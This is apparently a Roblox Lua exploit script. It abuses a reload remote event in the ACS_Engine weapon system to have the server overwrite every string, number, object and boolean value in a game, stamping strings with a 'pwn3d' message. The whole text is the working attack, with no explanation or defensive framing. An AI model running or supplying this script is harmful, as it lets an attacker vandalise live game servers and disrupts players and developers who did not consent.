function setValue(ValueObj,NewValue) -- NewValue
  game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Recarregar:FireServer(NewValue,{ACS_Modulo = {Variaveis = {StoredAmmo = ValueObj}}})
end

for _, obj in next, game:GetDescendants() do
   if obj:IsA("StringValue") then
       setValue(obj, "pwn3d by new users lol")
   end
   if obj:IsA("NumberValue") or obj:IsA("IntValue") then
       setValue(obj, 696969013370696969)
   end
   if obj:IsA("ObjectValue") then
       setValue(obj, game)
   end
   if obj:IsA("BoolValue") then
       setValue(obj, true)
   end
end